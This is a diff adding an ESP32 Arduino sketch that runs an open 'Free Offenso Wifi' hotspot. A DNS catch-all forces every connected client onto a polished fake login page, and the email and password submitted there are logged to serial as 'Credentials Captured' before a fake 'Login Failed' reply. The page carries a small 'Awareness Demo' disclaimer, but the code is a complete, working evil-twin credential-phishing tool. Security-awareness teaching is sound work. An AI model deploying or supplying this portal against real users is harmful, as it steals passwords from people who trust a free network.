@@ -1,0 +1,169 @@
+#include <WiFi.h>
+#include <WebServer.h>
+#include <DNSServer.h>
+
+// ===== CONFIG =====
+const char* apSSID = "Free Offenso Wifi";
+const char* apPassword = ""; // Open network
+
+IPAddress apIP(192,168,4,1);
+IPAddress netMsk(255,255,255,0);
+
+WebServer server(80);
+DNSServer dnsServer;
+const byte DNS_PORT = 53;
+
+// ===== SELECT MODE =====
+#define REDIRECT_MODE false   // true = redirect, false = fake login page
+
+// ===== REDIRECT CONFIG =====
+String redirectURL = "http://192.168.1.100:8080";  // Change to your laptop/server IP
+
+// ===== HANDLERS =====
+void handleRoot() {
+  if (REDIRECT_MODE) {
+    // Redirect Mode
+    server.sendHeader("Location", redirectURL, true);
+    server.send(302, "text/plain", "Redirecting...");
+  } else {
+    // Awareness Demo Login Page (Professional UI)
+    String page = R"rawliteral(
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WiFi Access Portal</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #1e3c72, #2a5298);
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .card {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(12px);
+      border-radius: 20px;
+      padding: 40px;
+      max-width: 350px;
+      width: 90%;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.4);
+      text-align: center;
+    }
+    h2 {
+      margin-bottom: 20px;
+      font-size: 26px;
+      font-weight: bold;
+      letter-spacing: 1px;
+    }
+    input {
+      width: 100%;
+      padding: 12px 15px;
+      margin: 10px 0;
+      border-radius: 10px;
+      border: none;
+      outline: none;
+      font-size: 15px;
+    }
+    input[type="submit"] {
+      background: #ff9800;
+      color: #fff;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    input[type="submit"]:hover {
+      background: #e68900;
+      transform: scale(1.03);
+    }
+    .note {
+      margin-top: 20px;
+      font-size: 13px;
+      color: #ffcccc;
+    }
+    .wifi-icon {
+      font-size: 40px;
+      margin-bottom: 15px;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="wifi-icon">📶</div>
+    <h2>Connect to Free WiFi</h2>
+    <form action="/login" method="POST">
+      <input type="text" name="email" placeholder="Email address" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <input type="submit" value="Continue">
+    </form>
+    <div class="note">⚠️ Awareness Demo – Do not enter real credentials.</div>
+  </div>
+</body>
+</html>
+)rawliteral";
+    server.send(200, "text/html", page);
+  }
+}
+
+void handleLogin() {
+  if (!REDIRECT_MODE) {
+    if (server.hasArg("email") && server.hasArg("password")) {
+      String email = server.arg("email");
+      String password = server.arg("password");
+
+      // Log credentials (awareness demo only!)
+      Serial.println("=== Credentials Captured ===");
+      Serial.println("Email: " + email);
+      Serial.println("Password: " + password);
+      Serial.println("============================");
+
+      server.send(200, "text/html", "<h3>Login Failed. Please try again later.</h3>");
+    } else {
+      server.send(400, "text/plain", "Bad Request");
+    }
+  }
+}
+
+void handleNotFound() {
+  handleRoot(); // All unknown routes handled same as root
+}
+
+void setup() {
+  Serial.begin(115200);
+  delay(1000);
+  Serial.println("\n=== ESP32 Awareness Captive Portal Started ===");
+
+  // Setup WiFi AP
+  WiFi.mode(WIFI_AP);
+  WiFi.softAPConfig(apIP, apIP, netMsk);
+  WiFi.softAP(apSSID, apPassword);
+
+  Serial.print("AP SSID: ");
+  Serial.println(apSSID);
+  Serial.print("AP IP: ");
+  Serial.println(apIP);
+
+  // DNS to capture all requests
+  dnsServer.start(DNS_PORT, "*", apIP);
+
+  // Routes
+  server.on("/", HTTP_GET, handleRoot);
+  server.onNotFound(handleNotFound);
+
+  if (!REDIRECT_MODE) {
+    server.on("/login", HTTP_POST, handleLogin);
+  }
+
+  server.begin();
+  Serial.println("Web server running...");
+}
+
+void loop() {
+  dnsServer.processNextRequest();
+  server.handleClient();
+}
